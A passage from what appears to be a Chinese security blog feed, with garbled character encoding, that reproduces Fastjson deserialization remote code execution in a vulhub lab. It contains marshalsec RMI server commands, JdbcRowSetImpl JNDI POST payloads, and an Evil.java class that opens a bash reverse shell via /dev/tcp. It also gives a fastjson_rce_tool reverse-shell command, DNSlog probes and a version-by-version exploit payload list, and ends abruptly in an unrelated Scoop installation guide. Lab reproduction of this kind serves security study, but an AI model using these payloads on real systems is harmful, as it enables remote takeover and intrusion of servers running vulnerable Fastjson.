class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å€ŸåŠ©<a href="https://github.com/mbechler/marshalsec">marshalsec</a>é¡¹ç›®ï¼Œå¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±»<code>TouchFile.class</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1ï¼š8989/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143924.png" alt="image-20210901133439751" style="zoom:80%;" />

<p>ä½¿ç”¨python æ­å»ºä¸€ä¸ªç®€å•çš„httpæœåŠ¡å™¨</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143667.png" alt="image-20210901133540829" style="zoom:80%;" />

<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a><strong>Payload</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144666.png" alt="image-20210901133841607"></p>
 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144883.png" alt="image-20210901134528910" style="zoom:67%;" />



<p>å¯è§å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼æ¼æ´æˆåŠŸå¤ç°</p>
<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312150318.png" alt="image-20210901133735111" style="zoom:67%;" />



<h3 id="DNSlog-æµ‹è¯•"><a href="#DNSlog-æµ‹è¯•" class="headerlink" title="DNSlog æµ‹è¯•"></a>DNSlog æµ‹è¯•</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v5guyp.dnslog.cn&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144158.png" alt="image-20210901144126030"></p>
<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>ä½¿ç”¨ <code>nc</code> ç›‘å¬å¾—åˆ°åå¼¹shell</p>
<blockquote>
<h4 id="Evil-java"><a href="#Evil-java" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144529.png" alt="image-20210901152322290" style="zoom:80%;" />

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144092.png" alt="image-20210901152340189"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144433.png" alt="image-20210901143418464" style="zoom:80%;" />



<h3 id="fastjson-rce-tool"><a href="#fastjson-rce-tool" class="headerlink" title="fastjson_rce_tool"></a><a href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_rce_tool</a></h3><p>ä½¿ç”¨  <code>fastjson_rce_tool</code> å¿«é€Ÿgetshell</p>
<p><a href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.56.1 8888  &quot;bash=bash -i &gt;&amp;/dev/tcp/192.168.56.1/9090 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145473.png" alt="image-20210901151615763" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 129</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;: &quot;rmi://192.168.56.1:8888/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144374.png" alt="image-20210901152003880" style="zoom:80%;" />





<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson&#x2F;1.2.47-rce"></a>fastjson&#x2F;1.2.47-rce</h2><p>ç›®æ ‡ç¯å¢ƒæ˜¯<code>openjdk:8u102</code>ï¼Œè¿™ä¸ªç‰ˆæœ¬æ²¡æœ‰<code>com.sun.jndi.rmi.object.trustURLCodebase</code>çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åˆ©ç”¨RMIè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p>
<h3 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ä½¿ç”¨ <code>vulhub</code> æ­å»º </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145045.png" alt="image-20210901185209143"></p>
<h3 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h3><p>ä½¿ç”¨ <code>nc</code> ç›‘å¬å¾—åˆ°åå¼¹shell</p>
<blockquote>
<h4 id="Evil-java-1"><a href="#Evil-java-1" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145880.png" alt="image-20210901152322290" style="zoom:80%;" />

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312156180.png" alt="image-20210901152340189"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>

 <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145814.png" alt="image-20210901143418464" style="zoom:80%;" />



<h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><h3 id="æœªçŸ¥ç›®æ ‡æ˜¯å¦ä½¿ç”¨-Fastjson-ï¼Œä½†ç«™ç‚¹æœ‰åŸå§‹æŠ¥é”™å›æ˜¾"><a href="#æœªçŸ¥ç›®æ ‡æ˜¯å¦ä½¿ç”¨-Fastjson-ï¼Œä½†ç«™ç‚¹æœ‰åŸå§‹æŠ¥é”™å›æ˜¾" class="headerlink" title="æœªçŸ¥ç›®æ ‡æ˜¯å¦ä½¿ç”¨ Fastjson ï¼Œä½†ç«™ç‚¹æœ‰åŸå§‹æŠ¥é”™å›æ˜¾"></a><strong>æœªçŸ¥ç›®æ ‡æ˜¯å¦ä½¿ç”¨ Fastjson ï¼Œä½†ç«™ç‚¹æœ‰åŸå§‹æŠ¥é”™å›æ˜¾</strong></h3><p>å¦‚æœç«™ç‚¹æœ‰åŸå§‹æŠ¥é”™å›æ˜¾ï¼Œå¯ä»¥ç”¨ä¸é—­åˆèŠ±æ‹¬å·çš„æ–¹å¼è¿›è¡ŒæŠ¥é”™å›æ˜¾ï¼ŒæŠ¥é”™ä¸­å¾€å¾€ä¼šæœ‰fastjsonçš„å­—æ ·</p>
<p>ä¾‹å¦‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145526.png" alt="image-20200704162617071"></p>
<h3 id="æ— å›æ˜¾ï¼Œé€šè¿‡DNSå›æ˜¾çš„æ–¹å¼ç›²åŒºåˆ†-Fastjson-å’Œ-Jackson"><a href="#æ— å›æ˜¾ï¼Œé€šè¿‡DNSå›æ˜¾çš„æ–¹å¼ç›²åŒºåˆ†-Fastjson-å’Œ-Jackson" class="headerlink" title="æ— å›æ˜¾ï¼Œé€šè¿‡DNSå›æ˜¾çš„æ–¹å¼ç›²åŒºåˆ† Fastjson å’Œ Jackson"></a><strong>æ— å›æ˜¾ï¼Œé€šè¿‡DNSå›æ˜¾çš„æ–¹å¼ç›²åŒºåˆ† Fastjson å’Œ Jackson</strong></h3><p>æˆ‘ä½¿ç”¨ä»¥ä¸‹payloadæµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145278.png" alt="image-20200704162844047"></p>
<p>æœ€ç»ˆæ”¶åˆ°dnslog</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146617.png" alt="image-20200704162922529"></p>
<h3 id="æœ€æ–°ç‰ˆæœ¬1-2-67ä¾ç„¶å¯ä»¥é€šè¿‡dnslogåˆ¤æ–­åç«¯æ˜¯å¦ä½¿ç”¨fastjson"><a href="#æœ€æ–°ç‰ˆæœ¬1-2-67ä¾ç„¶å¯ä»¥é€šè¿‡dnslogåˆ¤æ–­åç«¯æ˜¯å¦ä½¿ç”¨fastjson" class="headerlink" title="æœ€æ–°ç‰ˆæœ¬1.2.67ä¾ç„¶å¯ä»¥é€šè¿‡dnslogåˆ¤æ–­åç«¯æ˜¯å¦ä½¿ç”¨fastjson"></a>æœ€æ–°ç‰ˆæœ¬1.2.67ä¾ç„¶å¯ä»¥é€šè¿‡dnslogåˆ¤æ–­åç«¯æ˜¯å¦ä½¿ç”¨fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ç•¸å½¢çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146104.png" alt="img"></p>
<p>POC:</p>
<p>è¦åµŒå¥—åœ¨é‡Œé¢zeoé‡Œé¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>

<h2 id="å¤šç‰ˆæœ¬payloadé›†åˆ"><a href="#å¤šç‰ˆæœ¬payloadé›†åˆ" class="headerlink" title="å¤šç‰ˆæœ¬payloadé›†åˆ"></a>å¤šç‰ˆæœ¬payloadé›†åˆ</h2><p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h3><p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson-1"><a href="#fastjson-1" class="headerlink" title="fastjson&lt;&#x3D;1.2.41"></a>fastjson&lt;&#x3D;1.2.41</h3><p>å‰æï¼š<br>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;&#x3D;1.2.25é»˜è®¤ä¸ºfalseï¼‰</p>
<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson-2"><a href="#fastjson-2" class="headerlink" title="fastjson&lt;&#x3D;1.2.42"></a>fastjson&lt;&#x3D;1.2.42</h3><p>å‰æï¼š<br>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;&#x3D;1.2.25é»˜è®¤ä¸ºfalseï¼‰</p>
<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson-3"><a href="#fastjson-3" class="headerlink" title="fastjson&lt;&#x3D;1.2.43"></a>fastjson&lt;&#x3D;1.2.43</h3><p>å‰æï¼š<br>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;&#x3D;1.2.25é»˜è®¤ä¸ºfalseï¼‰</p>
<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson-4"><a href="#fastjson-4" class="headerlink" title="fastjson&lt;&#x3D;1.2.45"></a>fastjson&lt;&#x3D;1.2.45</h3><p>å‰æï¼š<br>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;&#x3D;1.2.25é»˜è®¤ä¸ºfalseï¼‰</p>
<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson-5"><a href="#fastjson-5" class="headerlink" title="fastjson&lt;&#x3D;1.2.47"></a>fastjson&lt;&#x3D;1.2.47</h3><p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap://x.x.x.x:1999/Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson-6"><a href="#fastjson-6" class="headerlink" title="fastjson&lt;&#x3D;1.2.62"></a>fastjson&lt;&#x3D;1.2.62</h3><p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<h3 id="fastjson-7"><a href="#fastjson-7" class="headerlink" title="fastjson&lt;&#x3D;1.2.66"></a>fastjson&lt;&#x3D;1.2.66</h3><p>å‰æï¼š<br>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;&#x3D;1.2.25é»˜è®¤ä¸ºfalseï¼‰</p>
<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransacti</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>Scoopä¸å®Œå…¨ä¸Šæ‰‹æŒ‡å—</title>
    <url>/articles/e7aa9a12/</url>
    <content><![CDATA[<h2 id="scoopä»‹ç»"><a href="#scoopä»‹ç»" class="headerlink" title="scoopä»‹ç»"></a>scoopä»‹ç»</h2><blockquote>
<p>   <a href="https://scoop.sh/">scoop</a>æ˜¯ä¸€ä¸ª windows ä¸‹çš„è½¯ä»¶åŒ…ç®¡ç†å™¨ï¼Œæ— éœ€ç®¡ç†å‘˜æƒé™ï¼Œå°†è½¯ä»¶å…¨éƒ¨å®‰è£…åˆ°ç”¨æˆ·æ–‡ä»¶å¤¹ä¸‹ï¼Œæ–¹ä¾¿ç®¡ç†ã€‚</p>
<p>  å®‰è£…ä¸€äº›å‘½ä»¤è¡Œè½¯ä»¶éå¸¸æ–¹ä¾¿ã€‚</p>
<p>  <a href="https://scoop.sh/">https://scoop.sh/</a></p>
<p>  å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://github.com/ScoopInstaller/Scoop/wiki/">https://github.com/ScoopInstaller/Scoop/wiki/</a></p>
</blockquote>
<p>ç±»ä¼¼çš„å‘½ä»¤è¡ŒåŒ…ç®¡ç†å·¥å…·è¿˜æœ‰ <code>Chocolatey</code> , ä½†å®‰è£…è·¯å¾„ä¸å¤Ÿç»Ÿä¸€ï¼Œscoopèƒ½åšåˆ°åŒä¸€æ–‡ä»¶å¤¹ä¸‹ç®¡ç†ã€‚</p>
<h2 id="å®‰è£…-scoop"><a href="#å®‰è£…-scoop" class="headerlink" title="å®‰è£… scoop"></a>å®‰è£… scoop</h2><p>æ‰“å¼€ Powershell çª—å£ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚</p>
